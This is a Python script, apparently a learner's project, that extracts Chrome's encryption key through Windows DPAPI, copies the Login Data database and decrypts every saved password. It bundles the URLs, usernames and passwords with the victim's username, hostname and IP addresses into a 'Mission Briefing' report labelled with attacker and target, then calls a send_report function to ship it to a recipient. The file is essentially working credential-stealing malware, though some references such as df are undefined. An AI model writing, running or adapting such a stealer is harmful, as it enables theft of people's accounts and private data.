#I want to learn how to access the passwords and details saved with Chrome browser

#Useful libraries that I would be working with -->
import os
import json
import base64
import sqlite3
import win32crypt
from Cryptodome.Cipher import AES
import shutil
import datetime
import ip_info


#Declaring the various variables
class ChromeDatabase:
    def __init__(self, attacker = None, target = None):
        try:
            self.attacker = attacker
            self.target = target
            self.datetime = datetime.datetime.now().strftime("%H:%M:%S %p. %d %B, %Y")
            self.user, self.host, self.publicIP, self.privateIP = ip_info.main()
            self.report = f"""{'~' * 30} CHROME DATABASE REPORT {'~' * 30}

        ~~~ Mission Details ~~~
Attacker: {self.attacker}
Target: {self.target}
Username: {self.user}
Hostname: {self.host}
Private IP: {self.privateIP}
Public IP: {self.publicIP}
Time Stamp: {self.datetime}


           ~~~ Mission Briefing ~~~      \n"""
        except Exception as e:
            print(f"An error occurred in ChromeDatabase __init__ due to [{e}]")

    #This function gets the master key that will be used for password decryption
    def getMasterKey(self):
        with open(os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Google\Chrome\User Data\Local State', "r") as f:
            localState = f.read()
            #print(f"Local State: {localState}")
            localState = json.loads(localState)
            #print(f"JSON Local State: {localState}")
        masterKey = base64.b64decode(localState["os_crypt"]["encrypted_key"])
        #print(f"Master Key: {masterKey}")
        masterKey = masterKey[5:]  # removing DPAPI
        masterKey = win32crypt.CryptUnprotectData(masterKey, None, None, None, 0)[1]
        #print(f"Unprotect Master Key: {masterKey} \n")
        return masterKey

    #This decrypts the payload
    def decryptPayload(self, cipher, payload):
        return cipher.decrypt(payload)

    #This generates the cipher
    def generateCipher(self, aesKey, iv):
        return AES.new(aesKey, AES.MODE_GCM, iv)

    #This decrypts the password
    def decryptPassword(self, buff, masterKey):
        try:
            iv = buff[3:15]
            payload = buff[15:-16]
            cipher = self.generateCipher(masterKey, iv)
            decryptedPass = self.decryptPayload(cipher, payload)
            decryptedPass = decryptedPass.decode() #Remove suffix bytes
            return decryptedPass
        except Exception as e:
            stat = f"[{e}], Chrome version is probably old\n"
            print(stat)
            return stat

    #This function handles the main function
    def main(self):
        masterKey = self.getMasterKey()
        loginDB = os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Google\Chrome\User Data\default\Login Data'
        #print(f"Login Database: {loginDB}")
        shutil.copy2(loginDB, "Loginvault.db") #Making a temporary copy since Login DataBase is locked while Chrome is running
        conn = sqlite3.connect("Loginvault.db")
        cursor = conn.cursor()
        try:
            cursor.execute("SELECT action_url, username_value, password_value FROM logins")
            credentials = ""
            #print(f"Cursor Fetchall: {cursor.fetchall()}")
            for r in cursor.fetchall():
                #print(f"R: {r}")
                url = r[0]
                username = r[1]
                encryptedPassword = r[2]
                #print(f"Buff/Encrypted Password: {encryptedPassword}")
                decryptedPassword = self.decryptPassword(encryptedPassword, masterKey)
                #print(f"Decrypted Password: {decryptedPassword}")
                if len(username) > 0:
                    #print(f"URL: {url} \nUser Name: {username} \nPassword: {decryptedPassword} \n{'*' * 50}")
                    credentials += f"\n{'*' * 50} \nURL: {url} \nUser Name: {username} \nPassword: {decryptedPassword} \n{'*' * 50}"
                    print()
            print(credentials)
            self.report += credentials
            
            #This section handles the sending of the report
            stat_ = df.send_report(self.target, "chromeDatabaseReport", self.report, "Chrome Database", receiver = self.xtraRecipient)
            return credentials
        except Exception as e:
            print(f"An error occurred in e1 due to [{e}]")
        cursor.close()
        conn.close()
        try:
            os.remove("Loginvault.db")
        except Exception as e:
            print(f"An error occurred in e2 due to [{e}]")
        return "Nothing ran"


if __name__ == "__main__": 
    #Commencing with the code -->
    print("CHROME DATABASE \n")

    attacker, target = "Uchiha Minato", "Konoha"
    scan = ChromeDatabase(attacker, target).main()
    #print(scan)

    print("\nExecuted Successfully!!")

